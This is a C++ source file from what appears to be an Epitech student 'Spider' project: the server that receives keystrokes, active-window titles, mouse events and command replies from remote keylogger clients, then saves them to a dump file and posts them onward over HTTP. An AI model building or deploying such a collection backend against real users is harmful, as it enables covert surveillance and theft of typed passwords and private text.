//
// Spider.cpp<travaux> for epitech in /home/chapui_s/rendu/
//
// Made by chapui_s
// Login   <chapui_s@epitech.eu>
//
// Started on  Wed Oct 21 09:18:47 2015 chapui_s
// Last update Tue Oct 27 17:24:05 2015 bresci_b bresci_b
//

#include <boost/asio/spawn.hpp>
#include "Spider.hh"
#include "Web.hh"

Spider::Spider(const boost::shared_ptr<ISocketEngine> &socket, Web &web)
  : _socket(socket),
    _web(web),
    _dumpFile(new DumpFile()),
    _httpPost(new HttpPost())
{
  DEBUG_MSG("Spider created");
  _socket->handleError([this](){dieInDignity();});
}

Spider::~Spider()
{
  DEBUG_MSG("Spider deleted");
}

void		Spider::dieInDignity()
{
  _web.deleteSpider(shared_from_this());
}

void		Spider::prepareFirstConnection()
{
  _socket->doHandshake(boost::asio::ssl::stream_base::server, [this]() {
      doFirstConnection();
    });
}

void			Spider::doFirstConnection()
{
  _socket->async_read(_buffer.data(), 4, [this]() {
      uint16_t		sizeName;

      _proto = _buffer.getValue<uint16_t>();

      if (_proto != PROTOCOL_VERSION) {
	std::cerr << "Wrong protocole" << std::endl;
	dieInDignity();
      }

      if ((sizeName = _buffer.getValue<uint16_t>()) >= SIZE_STRING) {
	std::cerr << "Wrong string size allowed" << std::endl;
	dieInDignity();
      }

      _buffer.reset();
      _socket->async_read(_buffer.data(), sizeName, [this, sizeName]() {
	  std::fill(_str, _str + SIZE_STRING, 0);
      	  _buffer.getValue<char>(_str, sizeName);
	  _name = _str;

	  try {
	    if (_dumpFile)
	      _dumpFile->createFile(_name);
	  }
	  catch (const std::exception &e) {
	    std::cerr << e.what() << std::endl;
	  }

	  char *reponse = new char;
	  reponse[0] = 1;
	  _socket->async_write(reponse, 1, [this, reponse]() mutable {
	      delete reponse;
	      boost::asio::spawn(_web.get_ioservice(), [this](boost::asio::yield_context yield) {
		  getTypeInfo(yield);
		});
	    });
      	});
    });
}

void			Spider::getTypeInfo(boost::asio::yield_context yield)
{
  for (;;) {
    uint8_t		id = 0;

    _buffer.reset();
    if (_socket->async_read(_buffer.data(), 1, yield)) {
      dieInDignity();
      return ;
    }

    id = _buffer.getValue<uint8_t>();
    std::cout << "ID: " << (int)id << std::endl;
    switch (id)
    {
    case (Paquet::KEYSTROKES):
      getKeystrokes(yield);
      break ;

    case (Paquet::MOUSE):
      getMouse(yield);
      break ;

    case (Paquet::COMMAND_CLIENT):
      getClientCMD(yield);
      break ;

    default:
      std::cerr << "Wrong data with spider " << _name << std::endl;
      return ;
    }
  }
}

void			Spider::getKeystrokes(boost::asio::yield_context &yield)
{
  uint16_t		sizeActive = 0;
  uint16_t		sizeText = 0;
  PaquetKeys		paquet;

  if (_socket->async_read(_buffer.data(), 6, yield)) {
    return ;
  }
  _buffer.reset();
  paquet.setDate(_buffer.getValue<uint32_t>());
  if ((sizeActive = _buffer.getValue<uint16_t>()) >= SIZE_STRING) {
    DEBUG_MSG("Wrong string size allowed");
    return ;
  }

  _buffer.reset();
  if (_socket->async_read(_buffer.data(), sizeActive, yield)) {
    return ;
  }

  if (sizeActive) {
    std::fill(_str, _str + SIZE_STRING, 0);
    _buffer.getValue<char>(_str, sizeActive);
    paquet.setActive(_str);
  }

  _buffer.reset();
  if (_socket->async_read(_buffer.data(), 2, yield)) {
    return ;
  }
  if ((sizeText = _buffer.getValue<uint16_t>()) >= SIZE_STRING) {
    DEBUG_MSG("Wrong string size allowed");
    return ;
  }

  _buffer.reset();
  if (_socket->async_read(_buffer.data(), sizeText, yield)) {
    return ;
  }

  std::fill(_str, _str + SIZE_STRING, 0);
  _buffer.getValue<char>(_str, sizeText);

  paquet.setText(_str);
  paquet.createPaquet();


#ifdef DEBUG
  std::cerr << paquet << std::endl;
#endif // !DEBUG

  try {
    if (_dumpFile)
      _dumpFile->writePaquet(&paquet);
    if (_httpPost)
      _httpPost->postPaquet(&paquet, _name);
  }
  catch (const std::exception &e) {
    std::cerr << e.what() << std::endl;
  }
}

void			Spider::getMouse(boost::asio::yield_context &yield)
{
  uint16_t		sizeActive = 0;
  PaquetMouse		paquet;

  if (_socket->async_read(_buffer.data(), 6, yield)) {
    return ;
  }

  _buffer.reset();
  paquet.setDate(_buffer.getValue<uint32_t>());
  sizeActive = _buffer.getValue<uint16_t>();

  _buffer.reset();
  if (_socket->async_read(_buffer.data(), sizeActive, yield)) {
    return ;
  }

  std::fill(_str, _str + SIZE_STRING, 0);
  _buffer.getValue<char>(_str, sizeActive);
  paquet.setActive(_str);

  _buffer.reset();
  if (_socket->async_read(_buffer.data(), 5, yield)) {
    return ;
  }

  paquet.setX(_buffer.getValue<uint16_t>());
  paquet.setY(_buffer.getValue<uint16_t>());
  paquet.setButton(_buffer.getValue<uint8_t>());
  paquet.createPaquet();

#ifdef DEBUG
  std::cerr << paquet << std::endl;
#endif // !DEBUG

  try {
    if (_dumpFile)
      _dumpFile->writePaquet(&paquet);
    if (_httpPost)
      _httpPost->postPaquet(&paquet, _name);
  }
  catch (const std::exception &e) {
    std::cerr << e.what() << std::endl;
  }
}


void			Spider::getClientCMD(boost::asio::yield_context &yield)
{
  uint16_t		sizeData = 0;
  PaquetCommandClient	paquet;

  if (_socket->async_read(_buffer.data(), 3, yield)) {
    return ;
  }

  _buffer.reset();
  paquet.setOk(_buffer.getValue<uint8_t>());
  sizeData = _buffer.getValue<uint16_t>();

  _buffer.reset();
  if (_socket->async_read(_buffer.data(), sizeData, yield)) {
    return ;
  }

  std::fill(_str, _str + SIZE_STRING, 0);
  _buffer.getValue<char>(_str, sizeData);
  paquet.setDataReponse(_str);
  paquet.createPaquet();

#ifdef DEBUG
      std::cerr << paquet << std::endl;
#endif // !DEBUG

}

// void			Spider::getMouse
// {
//   uint16_t		sizeActive = 0;
//   PaquetMouse		paquet;

//   _socket->async_read2(_buffer.data(), 6, yield);
// //  _buffer.reset();
//   paquet.setDate(_buffer.getValue<uint32_t>());
//   sizeActive = _buffer.getValue<uint16_t>();
//   _buffer.reset();
//   _socket->async_read(_buffer.data(), sizeActive, [this, &paquet, &sizeActive]() {
//       _buffer.getValue<char>(_str, sizeActive);
//       paquet.setActive(_str);

//       _buffer.reset();
//       _socket->async_read(_buffer.data(), 5, [this, &paquet]() {
// 	  paquet.setX(_buffer.getValue<uint16_t>());
// 	  paquet.setY(_buffer.getValue<uint16_t>());
// 	  paquet.setButton(_buffer.getValue<uint8_t>());
// 	  paquet.createPaquet();

// #ifdef DEBUG
// 	  std::cerr << paquet << std::endl;
// #endif // !DEBUG

// 	  try {
// 	    _json->writePaquetMouse(&paquet);
// 	  }
// 	  catch (const std::exception &e) {
// 	    std::cerr << e.what() << std::endl;
// 	  }

// //	  getTypeInfo();
// 	});
//     });
// }

// void			Spider::getKeystrokes()
// {
//   std::cout << "ICIIIIIIIIIIIIII\n";
//   uint16_t		sizeActive = 0;
//   uint16_t		sizeText = 0;
//   boost::shared_ptr<PaquetKeys>		paquet(new PaquetKeys);

//   _buffer.reset();
//   paquet->setDate(_buffer.getValue<uint32_t>());
//   sizeActive = _buffer.getValue<uint16_t>();

//   _buffer.reset();
//   _socket->async_read(_buffer.data(), sizeActive, [this, paquet, sizeActive, sizeText]() {

//       if (sizeActive) {
// 	memset(_str, 0, SIZE_STRING);
// 	_buffer.getValue<char>(_str, sizeActive);
// 	paquet->setActive(_str);
//       }

//       _buffer.reset();
//       _socket->async_read(_buffer.data(), 2, [this, paquet, sizeActive, sizeText]() mutable {
// 	  sizeText = _buffer.getValue<uint16_t>();

// 	  _buffer.reset();
// 	  _socket->async_read(_buffer.data(), sizeText, [this, paquet, sizeText]() {

// 	      memset(_str, 0, SIZE_STRING);
// 	      _buffer.getValue<char>(_str, sizeText);

// 	      paquet->setText(_str);
// 	      paquet->createPaquet();


// #ifdef DEBUG
// 	      std::cerr << *paquet << std::endl;
// #endif // !DEBUG

// 	      try {
// //		_json->writePaquetKeys(&paquet);
// 	      }
// 	      catch (const std::exception &e) {
// 		std::cerr << e.what() << std::endl;
// 	      }

// //	      getTypeInfo();
// 	    });
// 	});
//     });
// }

// void			Spider::getClientCMD()
// {
//   uint16_t		sizeData = 0;
//   PaquetCommandClient	paquet;

// //  _buffer.reset();
//   paquet.setOk(_buffer.getValue<uint8_t>());
//   sizeData = _buffer.getValue<uint16_t>();
//   _buffer.reset();
//   _socket->async_read(_buffer.data(), sizeData, [this, &paquet, &sizeData]() {
//       _buffer.getValue<char>(_str, sizeData);
//       paquet.setDataReponse(_str);
//       paquet.createPaquet();

// #ifdef DEBUG
//       std::cerr << paquet << std::endl;
// #endif // !DEBUG

//       // ICI

// //      getTypeInfo();
//     });
// }
